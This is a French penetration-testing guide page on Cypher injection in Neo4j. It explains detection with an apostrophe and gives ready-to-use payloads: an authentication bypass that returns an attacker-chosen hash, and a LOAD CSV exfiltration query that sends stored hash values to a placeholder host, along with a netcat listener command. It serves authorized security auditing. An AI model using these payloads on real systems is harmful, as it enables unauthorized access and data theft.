---
title: Injection Cypher (Neo4j)
tags:
  - offensif/audit-web-api
  - pentest
  - web
  - owasp
  - injection
  - cypher
  - neo4j
---
# Injection Cypher (Neo4j)

> **Note.** Principe
> Une injection Cypher cible le langage de requête du moteur de graphe **Neo4j**.
> Comme toute injection, elle résulte de la concaténation d'entrées non
> neutralisées dans une requête ; la syntaxe est simplement celle de Cypher.

## Détection

Comme en SQL, injecter une **apostrophe** `'` suffit le plus souvent à
déclencher une erreur révélant la vulnérabilité.

## Exploitation

Soit la requête applicative :

```cypher
MATCH (u:USER)-[:SECRET]->(h:SHA1) WHERE u.name = '<user>' RETURN h.value AS hash
```

### Contournement d'authentification

Le payload injecte une condition toujours vraie et force une valeur de retour,
en commentant la fin de la requête (`//`) :

```cypher
' OR true RETURN '283a54e090a56bd92e598874b0623c8796d9c4e4' AS hash //
```

La requête devient :

```cypher
MATCH (u:USER)-[:SECRET]->(h:SHA1) WHERE u.name = '' OR true RETURN '283a...' AS hash // ... RETURN h.value AS hash
```

### Exfiltration hors bande (LOAD CSV)

Cypher peut initier une requête HTTP sortante via `LOAD CSV`, permettant
d'exfiltrer une donnée vers un serveur contrôlé :

```cypher
admin' OR true LOAD CSV FROM 'http://<ip>:<port>/exfil='+h.value AS v RETURN v AS hash
```

> **Note.** Serveur d'écoute requis
> Un serveur doit écouter pour récupérer la donnée exfiltrée, par exemple
> `nc -lnvp <port>` (voir [cheat sheet](../06-Annexes/Cheat-sheet-Payloads-et-commandes.md)).

## CWE associés

- **CWE-943** : Improper Neutralization of Special Elements in Data Query Logic

> **Note.** Cadre d'usage
> Toute injection testée nécessite une autorisation écrite explicite — voir
> [Preambule-et-cadre-legal-Audit-Web-API](../00-Methodologie/Preambule-et-cadre-legal-Audit-Web-API.md).

## Voir également

- [Injection-NoSQL-MongoDB](Injection-NoSQL-MongoDB.md)
- [Injection-SQL](Injection-SQL.md)
